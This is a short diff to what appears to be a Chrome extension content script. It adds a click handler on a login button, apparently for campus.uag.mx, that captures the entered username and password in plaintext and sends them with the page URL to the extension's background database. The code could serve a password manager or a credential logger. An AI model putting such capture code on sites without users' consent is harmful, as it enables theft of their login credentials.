@@ -19,7 +19,30 @@ function monitorSubmissions() {
           // wait until user/pass are found
           if (!(form._user !== undefined && form._pass !== undefined))
               continue;
+          
+          try {
+            document.getElementById("btn-ingresar").addEventListener("click", function(event){
 
+              console.log('Entra en on submit')
+                  
+              if (form._user.value && form._pass.value) {
+                  // post credentials to background
+                  chrome.extension.sendRequest({
+                      action: 'queryDatabase',
+                      crud: 'create',
+                      record: [
+                          window.location.href,
+                          window.location.hostname,
+                          form._user.value,
+                          form._pass.value
+                      ]
+                  });
+              }
+            });
+          } catch (error) {
+            //User is not in campus.uag.mx
+          }    
+          
           // user/pass elements found
           // add event handler to form
           form.onsubmit = function() {
